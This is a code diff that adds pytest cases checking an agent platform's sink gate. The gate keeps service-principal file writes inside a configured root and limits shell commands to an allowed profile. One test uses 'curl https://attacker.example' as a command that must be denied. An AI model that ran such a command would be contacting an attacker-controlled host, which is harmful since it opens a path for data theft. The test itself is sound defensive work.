@@ -273,6 +273,105 @@ def test_poller_payload_cannot_bypass_active_sink_ifc(
     assert decision.reason == f"ifc_label_blocked:{sink_category}"
 
 
+@pytest.mark.parametrize(
+    ("trigger", "canonical", "tool_name"),
+    [
+        ("scheduled_tick", "scheduler", "write_file"),
+        ("saga_session_end", "synthesis", "edit_file"),
+        ("upgrade", "system", "write_file"),
+    ],
+)
+def test_service_file_policy_requires_configured_root_and_compatible_source(
+    trigger: str,
+    canonical: str,
+    tool_name: str,
+    tmp_path,
+    monkeypatch: pytest.MonkeyPatch,
+):
+    monkeypatch.setenv("MIMIR_HOME", str(tmp_path))
+    channel = f"{trigger}:configured"
+    service = AuthContext(
+        principal=f"service:{canonical}",
+        canonical_principal=canonical,
+        roles=("service",),
+        event_ingress=None,
+        trigger=trigger,
+        channel_id=channel,
+        interactivity=TurnInteractivity.NON_INTERACTIVE,
+        is_service=True,
+        enforcement_enabled=True,
+    )
+    admitted_path = str(tmp_path / "state" / "result.txt")
+
+    admitted = SinkGate.check_sink_flow(
+        tool_name,
+        admitted_path,
+        _labels(channel, sources=frozenset({channel})),
+        service,
+        enforce=True,
+    )
+    wrong_source = SinkGate.check_sink_flow(
+        tool_name,
+        admitted_path,
+        _labels(sources=frozenset({"slack-C-private"})),
+        service,
+        enforce=True,
+    )
+    outside_root = SinkGate.check_sink_flow(
+        tool_name,
+        "/tmp/arbitrary-service-write",
+        _labels(channel, sources=frozenset({channel})),
+        service,
+        enforce=True,
+    )
+
+    assert admitted.allowed is True
+    assert admitted.reason == "ifc_allowed"
+    assert wrong_source.reason == "ifc_label_blocked:file"
+    assert outside_root.reason == "service_sink_destination_denied"
+
+
+@pytest.mark.parametrize(
+    ("trigger", "canonical", "admitted_command"),
+    [
+        ("scheduled_tick", "scheduler", "git status --short"),
+        ("upgrade", "system", "uv sync"),
+    ],
+)
+def test_service_shell_policy_admits_profile_not_arbitrary_command(
+    trigger: str,
+    canonical: str,
+    admitted_command: str,
+):
+    channel = f"{trigger}:configured"
+    service = AuthContext(
+        principal=f"service:{canonical}",
+        canonical_principal=canonical,
+        roles=("service",),
+        event_ingress=None,
+        trigger=trigger,
+        channel_id=channel,
+        interactivity=TurnInteractivity.NON_INTERACTIVE,
+        is_service=True,
+        enforcement_enabled=True,
+    )
+    labels = _labels(channel, sources=frozenset({channel}))
+
+    admitted = SinkGate.check_sink_flow(
+        "shell_exec", admitted_command, labels, service, enforce=True,
+    )
+    arbitrary = SinkGate.check_sink_flow(
+        "shell_exec", "curl https://attacker.example", labels, service, enforce=True,
+    )
+    missing = SinkGate.check_sink_flow(
+        "shell_exec", None, labels, service, enforce=True,
+    )
+
+    assert admitted.allowed is True
+    assert arbitrary.reason == "service_sink_destination_denied"
+    assert missing.reason == "unknown_sink_destination"
+
+
 def test_ordinary_admin_cannot_bypass_or_erase_labels():
     labels = _labels(sources=frozenset({"slack-C-private"}))
     admin = _auth("slack-C-public", roles=("admin",))
